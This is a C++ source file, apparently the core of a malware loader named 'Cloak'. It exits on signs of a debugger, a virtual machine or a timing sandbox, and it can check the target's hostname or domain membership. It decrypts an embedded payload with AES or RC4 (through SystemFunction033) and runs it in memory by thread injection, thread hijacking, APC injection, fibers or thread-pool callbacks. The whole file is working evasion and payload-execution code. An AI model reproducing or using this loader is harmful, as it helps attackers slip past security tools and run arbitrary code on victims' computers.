#include "Cloak.hpp"
#include "Payload.hpp"

int CloakMain(PVOID Reserved) {

    #ifdef ANTI_DEBUG
    if ( IsDebugger() ) {
        #ifdef DEBUG
        printf( "[-] DEBUGGER DETECTED\n");
        #endif // !DEBUG
        
        return 0;
    }
    #endif // !ANTI_DEBUG

    #ifdef ANTI_VM
    if ( IsVm() ) {
        #ifdef DEBUG
        printf( "[-] VM DETECTED\n");
        #endif // !DEBUG
        
        return 0;
    }
    #endif // !ANTI_VM

    #ifdef CHECK_HOSTNAME
    if ( ! CheckHostname( HOSTNAME ) ) {
        #ifdef DEBUG
        printf( "[-] Hostnames do not match\n");
        #endif // !DEBUG
        
        return 0;
    }
    #endif // !CHECK_HOSTNAME

    #ifdef CHECK_DOMAIN_JOINED
    if ( ! CheckDomainJoined() ) {
        #ifdef DEBUG
        printf( "[-] Target Not Domain Joined\n");
        #endif // !DEBUG
        
        return 0;
    }
    #endif // !CHECK_DOMAIN_JOINED

    #ifdef DELAY
    DWORD t0 = GetTickCount64();

    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    if ( WaitForSingleObject( hEvent, DELAY * 1000 ) == WAIT_FAILED ) {
        #ifdef DEBUG
        printf( "[-] WaitForSingleObject Failed Wtih Error -> %d\n", GetLastError());
        #endif // !DEBUG
        
        return 1;
    }

    DWORD t1 = GetTickCount64();

    if ( ( DWORD ) ( t1 - t0 ) < DELAY * 1000 ) {
        return 0;
    }

    CloseHandle( hEvent );

    #endif // !DELAY

    PBYTE* pbPayload = NULL;

    #ifdef AES
    struct AES_ctx ctx;

    AES_init_ctx_iv( &ctx, Key, IV );
    AES_CBC_decrypt_buffer( &ctx, Payload, sizeof( Payload ) );
    #endif // !AES

    #ifdef RC4
    USTRING uKey    = {};
    uKey.Buffer     = Key;
    uKey.Length     = sizeof( Key );
    uKey.MaxLength  = sizeof( Key );

    USTRING uPayload    = {};
    uPayload.Buffer     = Payload;
    uPayload.Length     = sizeof( Payload );
    uPayload.MaxLength  = sizeof( Payload );

    fnSystemFunction033 SystemFunc33 = ( fnSystemFunction033 ) GetProcAddress( LoadLibraryA( "Advapi32" ), "SystemFunction033" );
    
    SystemFunc33(&uPayload, &uKey);

    pbPayload = ( PBYTE* ) uPayload.Buffer;
    #endif // !RC4

    if ( pbPayload == NULL ) {
        pbPayload = ( PBYTE* ) &Payload;
    }

    #ifdef LOCAL_THREAD
    if ( ! LocalThreadInject( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !LOCAL_THREAD

    #ifdef LOCAL_THREAD_HIJACK
    if ( ! LocalThreadHijack( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !LOCAL_THREAD_HIJACK

    #ifdef LOCAL_THREAD_HIJACK_ENUM
    if ( ! LocalThreadHijack( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !LOCAL_THREAD_HIJACK_ENUM

    #ifdef APC_INJECT
    if ( ! ApcInjection( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !APC_INJECT

    #ifdef FIBERS
    if ( ! FiberExec( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !FIBERS

    #ifdef THREADPOOLWAIT
    if ( ! ThreadPoolWait( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !THREADPOOLWAIT

    return 0;

}
